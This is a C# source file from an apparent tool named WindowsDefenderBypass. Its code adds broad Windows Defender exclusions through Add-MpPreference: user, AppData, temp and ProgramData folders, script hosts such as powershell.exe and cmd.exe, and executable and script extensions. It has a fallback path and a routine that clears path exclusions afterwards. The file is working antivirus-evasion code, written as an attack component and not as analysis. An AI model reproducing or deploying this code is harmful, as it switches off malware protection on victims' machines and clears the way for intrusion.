using System;
using System.IO;
using System.Management.Automation;

namespace WindowsDefenderBypass
{
    public static class ExclusionManager
    {
        private static readonly string[] CommonPaths = {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Path.GetTempPath().TrimEnd('\\'),
            @"C:\Windows\Temp",
            @"C:\ProgramData"
        };

        private static readonly string[] ProcessExclusions = { "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe" };
        private static readonly string[] ExtensionExclusions = { ".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".js" };

        public static void AddCommonExclusions()
        {
            PowerShellExecutor.ExecuteWithFallback(
                ps => AddExclusionsViaRunspace(ps),
                () => AddExclusionsFallback()
            );
        }

        private static void AddExclusionsViaRunspace(PowerShell ps)
        {
            foreach (string path in CommonPaths)
            {
                try
                {
                    PowerShellExecutor.ExecuteCommand(ps, $"Add-MpPreference -ExclusionPath \"{path}\"", false);
                    Console.WriteLine($"  [+] Added exclusion: {path}");
                }
                catch { }
            }

            foreach (string proc in ProcessExclusions)
            {
                try
                {
                    PowerShellExecutor.ExecuteCommand(ps, $"Add-MpPreference -ExclusionProcess \"{proc}\"", false);
                    Console.WriteLine($"  [+] Added process exclusion: {proc}");
                }
                catch { }
            }

            foreach (string ext in ExtensionExclusions)
            {
                try
                {
                    PowerShellExecutor.ExecuteCommand(ps, $"Add-MpPreference -ExclusionExtension \"{ext}\"", false);
                    Console.WriteLine($"  [+] Added extension exclusion: {ext}");
                }
                catch { }
            }
        }

        private static void AddExclusionsFallback()
        {
            Console.WriteLine("  [*] Using fallback method for exclusions...");

            foreach (string path in CommonPaths)
            {
                PowerShellHelper.RunPowerShellCommand($"Add-MpPreference -ExclusionPath \"{path}\"");
                Console.WriteLine($"  [+] Added exclusion: {path}");
            }

            foreach (string proc in ProcessExclusions)
            {
                PowerShellHelper.RunPowerShellCommand($"Add-MpPreference -ExclusionProcess \"{proc}\"");
                Console.WriteLine($"  [+] Added process exclusion: {proc}");
            }

            foreach (string ext in ExtensionExclusions)
            {
                PowerShellHelper.RunPowerShellCommand($"Add-MpPreference -ExclusionExtension \"{ext}\"");
                Console.WriteLine($"  [+] Added extension exclusion: {ext}");
            }
        }

        public static void RemoveAllExclusions()
        {
            PowerShellExecutor.ExecuteWithFallback(
                ps => {
                    var paths = PowerShellExecutor.ExecuteCommandWithResults(ps, 
                        "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath");

                    foreach (var path in paths)
                    {
                        if (path != null)
                        {
                            PowerShellExecutor.ExecuteCommand(ps, $"Remove-MpPreference -ExclusionPath \"{path}\"", false);
                        }
                    }
                    Console.WriteLine("  [+] Removed all path exclusions");
                },
                () => Console.WriteLine("  [!] Cannot remove exclusions without PowerShell runspace")
            );
        }
    }
}

